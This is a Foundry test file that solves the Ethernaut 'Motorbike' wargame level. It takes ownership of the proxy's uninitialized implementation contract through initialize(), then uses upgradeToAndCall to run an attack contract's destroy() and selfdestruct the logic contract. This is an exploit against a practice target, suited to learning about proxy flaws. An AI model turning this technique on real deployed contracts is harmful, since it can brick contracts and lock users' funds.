// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*25-MotorbikeTwo.t.sol'
pragma solidity <0.7.0;

import "forge-std/Test.sol";
import "../contracts/25-Motorbike.sol";
import "../contracts/25-MotorbikeFactory.sol";
import "../lib/forge-std/src/console2.sol";
import "../contracts/25-MotorbikeAttack.sol";

contract MotorbikeTest is Test {
    MotorbikeFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new MotorbikeFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 0.001 ether}(address(eoa));
    }

    function afterRun() public returns (bool) {
        console2.log("Running afterRun");
        return false;
    }

    function testCheck() public {

        address payable payableChallengeAddress = payable(challengeAddress);
        console2.log("Proxy:", payableChallengeAddress);
        console2.log("factoryContractAddress:", address(factoryContract));
        // Get Challenge Instance
        vm.startPrank(eoa, eoa);

        // Get storage slot two of the proxy contract to check what value is stored there
        bytes32 s = vm.load(challengeAddress, 0x0000000000000000000000000000000000000000000000000000000000000000);
        console2.logBytes32(s);
        // 0x0 = 0x000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0001
        // 0x01 = 0x3e8 = 1000
        // 0x02 = 0
        // 0x03 = 0

        // Read the implementation slot of the proxy
        bytes32 implementationSlot = vm.load(challengeAddress, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        console2.logBytes32(implementationSlot);

        address implementationAddress = address(bytes20(implementationSlot << 96));

        // Call initialize function on implementation contract to become the owner
        (bool success2,)=implementationAddress.call(abi.encodeWithSignature("initialize()"));
        require(success2, "Call to initialize failed");

        // Deploy attack contract
        MotorbikeAttack attackContract = new MotorbikeAttack();

        console2.log("implementationAddress (Engine):", implementationAddress);
        console2.log("attackContract:", address(attackContract));

        // Call upgradeToAndCall in implementation contract, deploying attack contract, and calling destroy function
        Engine engine = Engine(implementationAddress);
        engine.upgradeToAndCall(address(attackContract), abi.encodeWithSignature("destroy()"));
        // (bool success3,)=implementationAddress.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(attackContract), abi.encodeWithSignature("destroy()")));
        // require(success3, "Call to upgradeToAndCall failed");

        // Check contract size - selfdestruct has no effect until after the test!
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(implementationAddress) }
        console2.log("size:", size);
        // assertEq(false, size > 0, "Contract not destroyed");

        // bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        // assertEq(result, true, "Challenge should be solved");

        // ******* //

        // bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        // assertEq(result, true, "Challenge should be solved");

        // Delegatecall proxy contract, calling upgradeToAndCall
        // (bool success,)=challengeAddress.call(abi.encodeWithSelector(Engine.upgradeToAndCall.selector, address(0x0), abi.encodeWithSignature("initialize()")));

        // Call initializer function on proxy contract
        // (bool success,)=challengeAddress.call(abi.encodeWithSignature("initialize()"));
    }
}
